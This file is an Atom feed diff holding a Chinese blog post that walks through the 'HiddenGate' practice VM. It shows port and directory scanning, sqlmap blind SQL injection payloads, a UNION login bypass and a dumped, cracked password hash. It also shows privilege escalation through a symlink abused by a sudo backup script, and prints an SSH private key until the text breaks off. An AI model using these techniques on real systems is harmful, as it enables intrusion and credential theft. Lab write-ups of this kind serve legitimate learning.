@@ -1,0 +1,1261 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://zhangbsb.github.io</id>
+    <title>alekfj</title>
+    <updated>2025-05-23T03:07:33.108Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://zhangbsb.github.io"/>
+    <link rel="self" href="https://zhangbsb.github.io/atom.xml"/>
+    <subtitle>睡觉是一种解脱，睡着了就会不悲不气，不烦恼不孤单</subtitle>
+    <logo>https://zhangbsb.github.io/images/avatar.png</logo>
+    <icon>https://zhangbsb.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, alekfj</rights>
+    <entry>
+        <title type="html"><![CDATA[HiddenGate 靶机复盘]]></title>
+        <id>https://zhangbsb.github.io/post/hiddengate-ba-ji-fu-pan/</id>
+        <link href="https://zhangbsb.github.io/post/hiddengate-ba-ji-fu-pan/">
+        </link>
+        <updated>2025-05-23T02:59:33.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="hiddengate-靶机复盘">HiddenGate 靶机复盘</h1>
+<blockquote>
+<p>2025/5/22</p>
+<p>难度: hard   出题人: 大笔噶</p>
+</blockquote>
+<h2 id="端口扫描">端口扫描</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.77.50 -p-             
+[sudo] kali 的密码：
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-22 09:46 CST
+Nmap scan report for 192.168.77.50
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE    SERVICE
+80/tcp    filtered http
+25565/tcp open     minecraft
+MAC Address: 08:00:27:68:39:1D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
+
+</code></pre>
+<p>扫描后发现 <code>25565</code> 端口，我的世界，而 <code>80</code> 端口被忽略了</p>
+<p>我个傻逼没有我的世界，直接去 <code>web</code> 看看</p>
+<p>我们去 <code>web</code> 访问一下</p>
+<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522095018752.png" alt="image-20250522095018752" loading="lazy"></figure>
+<p>有内容，点击后发现按钮是假的</p>
+<p>查看源码</p>
+<pre><code class="language-html">
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;zh-CN&quot;&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;我的世界玩家空间&lt;/title&gt;
+  &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;style&gt;
+    body {
+      background-image: url('static/minecraft.png');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 50px 20px;
+    }
+
+    .title {
+      color: #ffffff;
+      margin-bottom: 50px;
+      text-align: center;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
+
+    .card-container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 30px;
+      width: 100%;
+      max-width: 1200px;
+    }
+
+    .feature-card {
+      background: rgba(255, 255, 255, 0.9);
+      border: 2px solid #8B4513;
+      border-radius: 15px;
+      padding: 30px;
+      text-align: center;
+      transition: transform 0.3s, box-shadow 0.3s;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .feature-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .card-icon {
+      font-size: 3rem;
+      margin-bottom: 20px;
+    }
+
+    .survival-icon {
+      color: #4CAF50;
+    }
+
+    .creative-icon {
+      color: #2196F3;
+    }
+
+    .multiplayer-icon {
+      color: #FF9800;
+    }
+
+    .card-title {
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+      color: #5D4037;
+      font-family: 'Minecraft', Arial, sans-serif;
+    }
+
+    .card-description {
+      color: #795548;
+      margin-bottom: 20px;
+    }
+
+    footer {
+      background-color: rgba(44, 62, 80, 0.9);
+      color: white;
+      text-align: center;
+      padding: 20px;
+      margin-top: auto;
+      position: relative;
+    }
+
+    .easter-egg {
+      position: absolute;
+      right: 10px;
+      bottom: 5px;
+      font-size: 0.7rem;
+      color: rgba(255, 255, 255, 0.3);
+      text-decoration: none;
+    }
+
+    .easter-egg:hover {
+      color: rgba(255, 255, 255, 0.5);
+    }
+
+    .minecraft-btn {
+      background-color: #7CB342;
+      color: white;
+      border: 2px solid #558B2F;
+      padding: 10px 20px;
+      font-family: 'Minecraft', Arial, sans-serif;
+      text-transform: uppercase;
+      transition: all 0.3s;
+    }
+
+    .minecraft-btn:hover {
+      background-color: #558B2F;
+      color: white;
+      transform: scale(1.05);
+    }
+
+    @font-face {
+      font-family: 'Minecraft';
+      src: url('static/fonts/Minecraft AE.woff2') format('woff2');
+    }
+  &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;div class=&quot;title&quot;&gt;
+      &lt;h1 style=&quot;font-family: 'Minecraft', Arial, sans-serif;&quot;&gt;我的世界玩家空间&lt;/h1&gt;
+      &lt;p class=&quot;lead&quot; style=&quot;color: #ffffff;&quot;&gt;选择您的游戏模式&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;card-container&quot;&gt;
+      &lt;div class=&quot;feature-card&quot;&gt;
+        &lt;i class=&quot;bi bi-tree-fill card-icon survival-icon&quot;&gt;&lt;/i&gt;
+        &lt;h2 class=&quot;card-title&quot;&gt;生存模式&lt;/h2&gt;
+        &lt;p class=&quot;card-description&quot;&gt;在充满挑战的世界中生存和建造&lt;/p&gt;
+        &lt;button class=&quot;minecraft-btn&quot;&gt;
+          进入世界
+        &lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;feature-card&quot;&gt;
+        &lt;i class=&quot;bi bi-building card-icon creative-icon&quot;&gt;&lt;/i&gt;
+        &lt;h2 class=&quot;card-title&quot;&gt;创造模式&lt;/h2&gt;
+        &lt;p class=&quot;card-description&quot;&gt;释放你的创造力，建造任何想象中的作品&lt;/p&gt;
+        &lt;button class=&quot;minecraft-btn&quot;&gt;
+          开始创造
+        &lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;div class=&quot;feature-card&quot;&gt;
+        &lt;i class=&quot;bi bi-people-fill card-icon multiplayer-icon&quot;&gt;&lt;/i&gt;
+        &lt;h2 class=&quot;card-title&quot;&gt;多人游戏&lt;/h2&gt;
+        &lt;p class=&quot;card-description&quot;&gt;与其他玩家一起探索和冒险&lt;/p&gt;
+        &lt;button class=&quot;minecraft-btn&quot;&gt;
+          加入服务器
+        &lt;/button&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;footer&gt;
+    &lt;p&gt;© 2025 我的世界玩家空间&lt;/p&gt;
+  &lt;/footer&gt;
+
+  &lt;script src=&quot;static/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;static/bootstrap-icons.css&quot;&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>没有东西我们去扫描目录</p>
+<h2 id="目录扫描">目录扫描</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ dirb &quot;http://192.168.77.50:25565&quot;
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu May 22 09:54:08 2025
+URL_BASE: http://192.168.77.50:25565/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.77.50:25565/ ----
++ http://192.168.77.50:25565/index.html (CODE:200|SIZE:4219)                                                                 
+==&gt; DIRECTORY: http://192.168.77.50:25565/mine/                                                                              
+==&gt; DIRECTORY: http://192.168.77.50:25565/static/                                                                            
+                                                                                                                             
+---- Entering directory: http://192.168.77.50:25565/mine/ ----
++ http://192.168.77.50:25565/mine/index.php (CODE:302|SIZE:0)                                                                
+                                                                                                                             
+---- Entering directory: http://192.168.77.50:25565/static/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Thu May 22 09:54:20 2025
+DOWNLOADED: 9224 - FOUND: 2
+
+</code></pre>
+<p>发现 <code>mine</code> 和 <code>static</code> 我们去访问一下</p>
+<figure data-type="image" tabindex="2"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522095634340.png" alt="image-20250522095634340" loading="lazy"></figure>
+<p>访问 <code>mine</code> 直接就给我跳出来登录了，那别的也不用访问了</p>
+<p>看到登录我就直接去爆破密码了，很明显没有成功，怎么明显（懒~~）</p>
+<p>那么，应该有可能是一个数据库，我们去注入一下</p>
+<h2 id="sql-注入">sql 注入</h2>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ sudo sqlmap -u http://192.168.77.50:25565/mine/login.php \
+&gt; --data &quot;username=admin&amp;password=123456&quot; \
+&gt; --level=3 --risk=3 --batch
+[sudo] kali 的密码：
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:01:58 /2025-05-22/
+
+[10:01:58] [INFO] resuming back-end DBMS 'mysql' 
+[10:01:58] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0flc5hn61d4...pndacgfbcj'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-8470' OR 9269=9269-- RSap&amp;password=123456
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 4769 FROM (SELECT(SLEEP(5)))grOX)-- IWVV&amp;password=123456
+---
+[10:01:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62, PHP
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+[10:01:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.77.50'
+
+[*] ending @ 10:01:58 /2025-05-22/
+
+</code></pre>
+<p>可以注入</p>
+<pre><code class="language-bash">[*] coffee
+[*] information_schema
+</code></pre>
+<pre><code class="language-bash">Database: coffee
+[1 table]
++-------+
+| users |
++-------+
+
+</code></pre>
+<pre><code class="language-bash">Database: coffee
+Table: users
+[1 entry]
++----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| user     | b0838efbde6accbc914c642981e4aef9 (smallfish) |
++----------+----------------------------------------------+
+</code></pre>
+<h2 id="反弹-shell">反弹 shell</h2>
+<p>密码账号都有了，登录</p>
+<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522100633699.png" alt="image-20250522100633699" loading="lazy"></figure>
+<p>按钮也都是假的，查看源码</p>
+<pre><code class="language-html">
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;我的世界问卷管理系统&lt;/title&gt;
+    &lt;link href=&quot;../static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        body {
+            background-color: #f5f6fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 50px 20px;
+        }
+
+        .title {
+            color: #2c3e50;
+            margin-bottom: 50px;
+            text-align: center;
+        }
+
+        .card-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            width: 100%;
+            max-width: 1200px;
+        }
+
+        .feature-card {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .card-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .view-icon {
+            color: #3498db;
+        }
+
+        .add-icon {
+            color: #27ae60;
+        }
+
+        .delete-icon {
+            color: #e74c3c;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #2c3e50;
+        }
+
+        .card-description {
+            color: #7f8c8d;
+            margin-bottom: 20px;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+            position: relative;
+        }
+
+        .easter-egg {
+            position: absolute;
+            right: 10px;
+            bottom: 5px;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.3);
+            text-decoration: none;
+        }
+
+        .easter-egg:hover {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .beian {
+            display: block;
+            margin-top: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .beian:hover {
+            color: rgba(255, 255, 255, 0.8);
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;title&quot;&gt;
+            &lt;h1&gt;我的世界问卷管理系统&lt;/h1&gt;
+            &lt;p class=&quot;lead&quot;&gt;选择您需要的功能&lt;/p&gt;
+        &lt;/div&gt;
+
+        &lt;div class=&quot;card-container&quot;&gt;
+            &lt;div class=&quot;feature-card&quot; onclick=&quot;location.href='./mine-get.php'&quot;&gt;
+                &lt;i class=&quot;bi bi-eye-fill card-icon view-icon&quot;&gt;&lt;/i&gt;
+                &lt;h2 class=&quot;card-title&quot;&gt;查看问题&lt;/h2&gt;
+                &lt;p class=&quot;card-description&quot;&gt;浏览所有我的世界测试题目&lt;/p&gt;
+                &lt;button class=&quot;btn btn-primary&quot;&gt;
+                    &lt;i class=&quot;bi bi-arrow-right&quot;&gt;&lt;/i&gt; 进入
+                &lt;/button&gt;
+            &lt;/div&gt;
+
+            &lt;div class=&quot;feature-card&quot; onclick=&quot;location.href='./mine-add.php'&quot;&gt;
+                &lt;i class=&quot;bi bi-plus-circle-fill card-icon add-icon&quot;&gt;&lt;/i&gt;
+                &lt;h2 class=&quot;card-title&quot;&gt;添加问题&lt;/h2&gt;
+                &lt;p class=&quot;card-description&quot;&gt;创建新的我的世界测试题目&lt;/p&gt;
+                &lt;button class=&quot;btn btn-success&quot;&gt;
+                    &lt;i class=&quot;bi bi-arrow-right&quot;&gt;&lt;/i&gt; 进入
+                &lt;/button&gt;
+            &lt;/div&gt;
+
+            &lt;div class=&quot;feature-card&quot; onclick=&quot;location.href='./mine-delete.php'&quot;&gt;
+                &lt;i class=&quot;bi bi-trash-fill card-icon delete-icon&quot;&gt;&lt;/i&gt;
+                &lt;h2 class=&quot;card-title&quot;&gt;删除问题&lt;/h2&gt;
+                &lt;p class=&quot;card-description&quot;&gt;移除不需要的测试题目&lt;/p&gt;
+                &lt;button class=&quot;btn btn-danger&quot;&gt;
+                    &lt;i class=&quot;bi bi-arrow-right&quot;&gt;&lt;/i&gt; 进入
+                &lt;/button&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;footer&gt;
+        &lt;a href=&quot;repair1.php&quot; class=&quot;easter-egg&quot;&gt;Repair&lt;/a&gt;
+    &lt;/footer&gt;
+
+    &lt;script src=&quot;../static/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;../static/bootstrap-icons.css&quot;&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>有目录 <code>&lt;a href=&quot;repair1.php&quot; class=&quot;easter-egg&quot;&gt;Repair&lt;/a&gt; </code> 去访问一下 <code>（如果你眼神好可以看到右下角，可以直接访问）</code></p>
+<figure data-type="image" tabindex="4"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522100912509.png" alt="image-20250522100912509" loading="lazy"></figure>
+<pre><code class="language-html">
+  &lt;!DOCTYPE html&gt;
+  &lt;html&gt;
+
+  &lt;head&gt;
+    &lt;title&gt;Access Denied&lt;/title&gt;
+  &lt;/head&gt;
+
+  &lt;body&gt;
+    &lt;div class=&quot;message&quot;&gt;
+      &lt;h1&gt;Access denied&lt;/h1&gt;
+      &lt;div class=&quot;user-info&quot;&gt;
+        当前用户: user      &lt;/div&gt;
+      &lt;!-- only admin --&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+
+  &lt;/html&gt;
+  
+</code></pre>
+<p>要 <code>admin</code> 登录才可以访问，可是注入的时候没有 <code>admin</code> 用户，那应该是让我们联合查询一下</p>
+<p><code>' UNION select 1,'admin','123' --</code></p>
+<figure data-type="image" tabindex="5"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522101659370.png" alt="image-20250522101659370" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250522101958314.png" alt="image-20250522101958314" loading="lazy"></figure>
+<h2 id="提权-xiaoyuega">提权 xiaoyuega</h2>
+<pre><code class="language-bash">www-data@HiddenGate:/var/www/html/mine$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@HiddenGate:/var/www/html/mine$ ls -al  
+ls -al
+total 28
+drwxr-xr-x 2 root root 4096 May 10 12:04 .
+drwxr-xr-x 4 root root 4096 May 10 12:05 ..
+-rw-r--r-- 1 root root 4620 May 10 12:04 index.php
+-rw-r--r-- 1 root root 4910 May 10 12:04 login.php
+-rw-r--r-- 1 root root 2562 May 10 12:04 repair1.php
+www-data@HiddenGate:/var/www/html/mine$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on HiddenGate:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on HiddenGate:
+    (xiaoyuega) NOPASSWD: /usr/local/bin/backup.sh
+www-data@HiddenGate:/var/www/html/mine$ cd /home
+cd /home
+www-data@HiddenGate:/home$ ls -al
+ls -al
+total 12
+drwxr-xr-x  3 root      root      4096 May 10 12:17 .
+drwxr-xr-x 18 root      root      4096 May 11 04:31 ..
+drwxr-x---  4 xiaoyuega xiaoyuega 4096 May 20 21:01 xiaoyuega
+</code></pre>
+<p>发现 <code>backup.sh</code> 我们运行一下</p>
+<pre><code class="language-bash">www-data@HiddenGate:/$ sudo -u xiaoyuega backup.sh
+sudo -u xiaoyuega backup.sh
+=== Starting Minecraft Server Backup ===
+Source: /opt/minecraft_server
+Destination: /tmp/backup/backup_20250521_222507
+[1/4] Checking source directory...
+[2/4] Preparing backup directory...
+[3/4] Copying world data (this may take a while)...
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/level.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/level.dat_old&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/1af2ecc6-000c-36aa-8a0a-5ce9c13df15b.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/1af2ecc6-000c-36aa-8a0a-5ce9c13df15b.dat_old&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/40b85b64-3dd4-39e8-bdb1-89934665382f.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/416246f2-6ab2-3aeb-aabb-2013fd9e7afd.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/a59fe3d4-1e1f-3432-9244-c8ec02a60dd0.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/a59fe3d4-1e1f-3432-9244-c8ec02a60dd0.dat_old&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/b0b1cd05-a4de-30bc-b377-fe727ccaff55.dat&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/b0b1cd05-a4de-30bc-b377-fe727ccaff55.dat_old&quot;: Permission denied (13)
+rsync: [sender] send_files failed to open &quot;/opt/minecraft_server/world/playerdata/e1edbcd0-0568-3fbd-b67b-6e7766cf24df.dat&quot;: Permission denied (13)
+rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1333) [sender=3.2.3]
+[4/4] Verifying backup...
+SUCCESS: Backup completed successfully!
+Backup location: /tmp/backup/backup_20250521_222507
+=== Backup Process Completed ===
+www-data@HiddenGate:/$ 
+</code></pre>
+<p>是一个备份脚本 备份<code>/opt/minecraft_server</code></p>
+<p>我们去创建一个软连接，将大笔噶的家目录一起备份下来</p>
+<pre><code class="language-bash">www-data@HiddenGate:/$ cd /opt/minecraft_server
+cd /opt/minecraft_server
+www-data@HiddenGate:/opt/minecraft_server$ ls -al
+ls -al
+total 55984
+drwxrwxrwx  7 root root     4096 May 21 22:24 .
+drwxr-xr-x  4 root root     4096 May 11 04:29 ..
+-rw-r--r--  1 root root        2 May 21 21:39 banned-ips.json
+-rw-r--r--  1 root root        2 May 21 21:39 banned-players.json
+drwxr-xr-x  2 root root     4096 May 10 02:42 crash-reports
+-rw-r--r--  1 root root      157 May  9 14:35 eula.txt
+drwxr-xr-x  8 root root     4096 May  9 14:35 libraries
+drwxr-xr-x  2 root root     4096 May 21 21:39 logs
+-rw-r--r--  1 root root      137 May 21 21:39 ops.json
+-rw-r--r--  1 root root 57269758 May  9 14:32 server.jar
+-rw-r--r--  1 root root     1399 May 21 21:39 server.properties
+-rw-r--r--  1 root root      638 May 21 21:39 usercache.json
+drwxr-xr-x  3 root root     4096 May  9 14:35 versions
+-rw-r--r--  1 root root        2 May  9 14:35 whitelist.json
+drwxr-xr-x 12 root root     4096 May 21 21:40 world
+www-data@HiddenGate:/opt/minecraft_server$ ln -s /home/xiaoyuega sb
+ln -s /home/xiaoyuega sb
+www-data@HiddenGate:/opt/minecraft_server$ ls -al
+ls -al
+total 55984
+drwxrwxrwx  7 root     root         4096 May 21 22:27 .
+drwxr-xr-x  4 root     root         4096 May 11 04:29 ..
+-rw-r--r--  1 root     root            2 May 21 21:39 banned-ips.json
+-rw-r--r--  1 root     root            2 May 21 21:39 banned-players.json
+drwxr-xr-x  2 root     root         4096 May 10 02:42 crash-reports
+-rw-r--r--  1 root     root          157 May  9 14:35 eula.txt
+drwxr-xr-x  8 root     root         4096 May  9 14:35 libraries
+drwxr-xr-x  2 root     root         4096 May 21 21:39 logs
+-rw-r--r--  1 root     root          137 May 21 21:39 ops.json
+lrwxrwxrwx  1 www-data www-data       15 May 21 22:27 sb -&gt; /home/xiaoyuega
+-rw-r--r--  1 root     root     57269758 May  9 14:32 server.jar
+-rw-r--r--  1 root     root         1399 May 21 21:39 server.properties
+-rw-r--r--  1 root     root          638 May 21 21:39 usercache.json
+drwxr-xr-x  3 root     root         4096 May  9 14:35 versions
+-rw-r--r--  1 root     root            2 May  9 14:35 whitelist.json
+drwxr-xr-x 12 root     root         4096 May 21 21:40 world
+www-data@HiddenGate:/opt/minecraft_server$ 
+</code></pre>
+<p>运行 <code>backup.sh</code></p>
+<pre><code class="language-bash">SUCCESS: Backup completed successfully!
+Backup location: /tmp/backup/backup_20250521_222948
+=== Backup Process Completed ====
+</code></pre>
+<p>访问 <code>/tmp/backup/backup_20250521_222948</code></p>
+<pre><code class="language-bash">www-data@HiddenGate:/home$ cd /tmp/backup/backup_20250521_222948
+cd /tmp/backup/backup_20250521_222948
+www-data@HiddenGate:/tmp/backup/backup_20250521_222948$ ls -al
+ls -al
+total 55988
+drwxr-xr-x  8 xiaoyuega xiaoyuega     4096 May 21 22:27 .
+drwxr-xr-x  5 xiaoyuega xiaoyuega     4096 May 21 22:29 ..
+-rwxr-xr-x  1 xiaoyuega xiaoyuega        2 May 21 21:39 banned-ips.json
+-rwxr-xr-x  1 xiaoyuega xiaoyuega        2 May 21 21:39 banned-players.json
+drwxr-xr-x  2 xiaoyuega xiaoyuega     4096 May 10 02:42 crash-reports
+-rwxr-xr-x  1 xiaoyuega xiaoyuega      157 May  9 14:35 eula.txt
+drwxr-xr-x  8 xiaoyuega xiaoyuega     4096 May  9 14:35 libraries
+drwxr-xr-x  2 xiaoyuega xiaoyuega     4096 May 21 21:39 logs
+-rwxr-xr-x  1 xiaoyuega xiaoyuega      137 May 21 21:39 ops.json
+drwxr-xr-x  4 xiaoyuega xiaoyuega     4096 May 20 21:01 sb
+-rwxr-xr-x  1 xiaoyuega xiaoyuega 57269758 May  9 14:32 server.jar
+-rwxr-xr-x  1 xiaoyuega xiaoyuega     1399 May 21 21:39 server.properties
+-rwxr-xr-x  1 xiaoyuega xiaoyuega      638 May 21 21:39 usercache.json
+drwxr-xr-x  3 xiaoyuega xiaoyuega     4096 May  9 14:35 versions
+-rwxr-xr-x  1 xiaoyuega xiaoyuega        2 May  9 14:35 whitelist.json
+drwxr-xr-x 12 xiaoyuega xiaoyuega     4096 May 21 21:40 world
+www-data@HiddenGate:/tmp/backup/backup_20250521_222948$ cd sb/.ssh
+cd sb/.ssh
+www-data@HiddenGate:/tmp/backup/backup_20250521_222948/sb/.ssh$ ls -al
+ls -al
+total 20
+drwxr-xr-x 2 xiaoyuega xiaoyuega 4096 May 10 13:40 .
+drwxr-xr-x 4 xiaoyuega xiaoyuega 4096 May 20 21:01 ..
+-rwxr-xr-x 1 xiaoyuega xiaoyuega  397 May 10 13:40 authorized_keys
+-rwxr-xr-x 1 xiaoyuega xiaoyuega 1876 May 10 13:40 id_rsa
+-rwxr-xr-x 1 xiaoyuega xiaoyuega  397 May 10 13:40 id_rsa.pub
+www-data@HiddenGate:/tmp/backup/backup_20250521_222948/sb/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDanbd68I
+Gn8cHDrgn3ITvfAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDG/UIHmYrO
+OG9YpMl2eW28QoyMoeJR9eNLsuiH9fQtzQZu29QgH0aZEqeT5XOgDEFzlEtlXwDbA1yQva
+NAv1Owx8oE0Gj25vp6eZY9HHnaT1Y3zxhJGIvLglV9f4OzJnzjtJtxSBNY9hEwdudtzVKt
+qsgu2Rd8M87ao1HjwPxFBdgfqcJ6kfKW8Ismj1f4z4uYtPmYt7qWDgbtFbN5xWi2qs2j1R
+xx/bSmYzG+mwKnpxBRT3LMeQflskzkAKZk6O/Rj98rUk+WagN0kv/DtjJWPM0DNB/czfi4
+xnTBDi+48jsDp1DEQH6dlB6SYh4OOqgKRZ+ZzyOk3GiDFMAkDQVJAAAD0L9wyft/hgdx04
+MdsU6WZnfa7/b/p9A2Xo2Mq6fowcO3n44BPobNDmSKCf5XPlLxBh0cbeTwLnRECltWZ46u
+h35S1VmpKxC6IRLqP9EtuJRP+6pfM3C92pG1MXL+jqK5cNqmgwJjMX5hkABeN4+6oBLI7g
+wN3qbG2NGaYTtpkHTHE9X0vItg8yTdRzxMMJVeRxM95rMQn7ppORxZRpBZQxBixFTrvc3Z
+sbiILySXTZRvmOPylFTXVh+qW3Hz5bw7uEuhCrAtM7F3JRWwtHl6LwFRBAceNQ/4u+lVoL
+y3r+WUqWYQ7ji6YRNMBgq73eYsF1rtB83vSVDYOFv3kCfKfwPTxDZGwQeegldurbXquBui
+dwfJ3QIR5AO7dv4p49XWZFrnD/7aIABA/RWMJOqpuYLio8M0O57fmfOlWVnQS+YDeAzg9A
+kIWPvyK/PO0aRqSbLt1GmvUlmasAOjmwykKOnl6duxghEU8cEv6JeNIvyKj40DRlRGcyJl
+2AdnK1chvzB3mw83dtQqb/RvCDr3DlMeZqA/3t4IpiQmZwRi7FQxos20fwvdkZ1w9q9UWT
+4K7xsom5bMgbp3ujUR3JN7xZYNq3Q/+g/QDM9i0uV3eUSZltb42czfcrHdrIVVHWPci28J
+pfDvDzE1QlyEnCKNH2TcPxaiXgmGsRJ6NCr/CeiahiHEkZiowdSo5fl6+wwXxuBnnO60hG
+8s1en5yJ0j6yslVheHOZT2942jc+CU3oJ5tc3JQW1amI0cJjj0Q8TtOzQIrqiDA8DePrcp
